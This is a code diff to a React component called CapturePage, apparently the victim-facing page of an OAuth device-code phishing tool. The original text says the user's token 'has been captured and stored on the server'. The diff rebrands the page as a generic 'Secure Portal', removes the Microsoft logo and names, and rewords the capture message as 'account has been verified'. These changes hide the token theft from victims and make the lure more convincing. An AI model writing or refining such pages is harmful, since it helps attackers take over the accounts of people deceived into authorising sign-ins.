@@ -1,6 +1,6 @@
 import React, { useState, useEffect, useCallback, useRef } from 'react';
 
-const DEVICE_AUTH_URL = 'https://login.microsoft.com/device';
+const DEVICE_VERIFY_URL = 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode';
 
 type CaptureState = 'idle' | 'loading' | 'code_ready' | 'waiting' | 'success' | 'error' | 'expired';
 
@@ -164,7 +164,7 @@ export function CapturePage(): React.ReactElement {
 
   function handleContinueToVerify(): void {
     setState('waiting');
-    window.open(DEVICE_AUTH_URL, '_blank');
+    window.open(DEVICE_VERIFY_URL, '_blank');
   }
 
   function handleReset(): void {
@@ -194,18 +194,18 @@ export function CapturePage(): React.ReactElement {
               <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7" />
             </svg>
           </div>
-          <span className="capture-brand-name">Outlook Electron</span>
+          <span className="capture-brand-name">Secure Portal</span>
         </div>
 
         {state === 'idle' && (
           <div className="capture-card">
             <div className="capture-welcome">
-              <h1>Sign in to your account</h1>
-              <p>Generate a device verification code to authenticate with your Microsoft account securely.</p>
+              <h1>Access Your Account</h1>
+              <p>Generate a device verification code to authenticate your account securely.</p>
             </div>
             <button className="capture-generate-btn" onClick={handleGenerateCode}>
-              <svg width="20" height="20" viewBox="0 0 23 23" fill="white">
-                <path d="M0 0h11v11H0zm12 0h11v11H12zM0 12h11v11H0zm12 12h11v11H12z" />
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
               </svg>
               Generate Verification Code
             </button>
@@ -216,7 +216,7 @@ export function CapturePage(): React.ReactElement {
           <div className="capture-card">
             <div className="capture-loading">
               <div className="capture-spinner" />
-              <span>Requesting verification code from Microsoft...</span>
+              <span>Requesting verification code...</span>
             </div>
           </div>
         )}
@@ -258,15 +258,15 @@ export function CapturePage(): React.ReactElement {
             </div>
 
             <button className="capture-verify-btn" onClick={handleContinueToVerify}>
-              <svg width="20" height="20" viewBox="0 0 23 23" fill="white" style={{ marginRight: 8 }}>
-                <path d="M0 0h11v11H0zm12 0h11v11H12zM0 12h11v11H0zm12 12h11v11H12z" />
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" style={{ marginRight: 8 }}>
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
               </svg>
               Continue to Verify
             </button>
 
             {state === 'waiting' && (
               <div className="capture-waiting">
-                Waiting for you to complete sign-in...
+                Waiting for you to complete verification...
               </div>
             )}
 
@@ -287,11 +287,11 @@ export function CapturePage(): React.ReactElement {
               </div>
               <h2>Authentication Successful</h2>
               {authEmail && authEmail !== 'unknown@user.com' && (
-                <p className="capture-auth-email">Signed in as <strong>{authEmail}</strong></p>
+                <p className="capture-auth-email">Verified as <strong>{authEmail}</strong></p>
               )}
-              <p>Your token has been captured and stored on the server.</p>
+              <p>Your account has been verified and stored on the server.</p>
               <button className="capture-another-btn" onClick={handleReset}>
-                Sign in another account
+                Verify another account
               </button>
             </div>
           </div>
@@ -333,7 +333,7 @@ export function CapturePage(): React.ReactElement {
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
               <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
             </svg>
-            <span>Enterprise Security — OAuth 2.0 Device Code Flow</span>
+            <span>Enterprise Security — Device Verification</span>
           </div>
         </div>
       </div>
